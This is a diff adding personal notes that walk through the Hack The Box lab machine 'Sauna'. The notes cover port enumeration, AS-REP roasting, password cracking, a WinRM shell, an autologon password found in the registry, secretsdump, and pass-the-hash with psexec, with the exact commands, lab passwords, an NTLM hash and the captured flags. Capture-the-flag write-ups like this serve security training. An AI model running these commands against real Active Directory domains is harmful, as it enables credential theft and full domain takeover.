@@ -1,0 +1,94 @@
+* Sauna
+** enumeration
+*** 53/tcp   open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+*** 80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Egotistical Bank :: Home
+
+~TRACE~ doesn't seem to work in practice, it returns a 501
+~POST~ on the pages with forms doesn't seem to work in practice, it returns a 405
+
+*** 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-05-04 08:24:58Z)
+*** 135/tcp  open  msrpc         Microsoft Windows RPC
+*** 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+*** 389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+*** 445/tcp  open  microsoft-ds?
+❯ smbclient -L $TARGET
+Enter WORKGROUP\user's password: 
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+SMB1 disabled -- no workgroup available
+
+*** 464/tcp  open  kpasswd5?
+*** 593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+*** 636/tcp  open  tcpwrapped
+*** 3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+*** 3269/tcp open  tcpwrapped
+** foothold
+
+We need an AD user/pass to gain a foothold likely, without any obvious web vuln.
+GetNPUsers is a solid way to get a hash, and we can harvest the team members listed on the website as a source of potential usernames.
+
+After trying a bunch of variations, I get one hit: *FSmith*.
+
+~GetNPUsers.py egotistical-bank.local/FSmith -request -no-pass -dc-ip $TARGET~
+
+JohnTheRipper can crack the password out of the hash: ~Thestrokes23~
+
+Then ~evil-winrm~ should get us a shell.
+
+~secretsdump~ doesn't seem to provide any further users.
+
+~GetADUsers~ enumerates other users:
+
+Name                  Email                           PasswordLastSet      LastLogon      
+--------------------  ------------------------------  -------------------  -------------------
+Administrator                                         2020-01-24 17:14:15.321116  2020-02-10 16:16:17.478519
+Guest                                                 <never>              <never>        
+krbtgt                                                2020-01-23 05:45:30.587720  <never> 
+HSmith                                                2020-01-23 05:54:34.140321  <never> 
+FSmith                                                2020-01-23 16:45:19.047096  2020-05-05 08:04:44.123781
+svc_loanmgr                                           2020-01-24 23:48:31.678079  <never> 
+
+~smbclient.py -target-ip $TARGET egotistical-bank.local/FSmith:Thestrokes23@TARGET~
+gets a samba connection
+
+*shares*:
+ * ADMIN$
+ * C$
+ * IPC$
+ * NETLOGON
+ * print$
+ * RICOH Aficio SP 8300DN PCL 6
+ * SYSVOL
+
+Seemingly evil-winrm and other impacket tools aren't working because I need to use a kerberos ticket instead of a password.
+
+Also need to fix clock skew issue
+Have to turn off ntp service with systemctl
+
+... ~evil-winrm~ *does* work with just password, the machine just needed a reset?
+USER: 1b5520b98d97cf17f24122a55baf70cf
+
+** escalation
+
+*** lateral
+
+querying the registry for winlogon reveals a default password: Moneymakestheworldgoround! 
+which works for svc_loanmgr
+
+and secretsdump works for ~svc_loanmgr~
+
+Now given the hash dump from svc_loanmgr, we can pass the hash with ~psexec~
+
+❯ psexec.py -dc-ip $TARGET -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff egotistical-bank.local/administrator@sauna.egotistical-bank.local
+
+ROOT: f3ee04965c68257382e31502cc5e881f
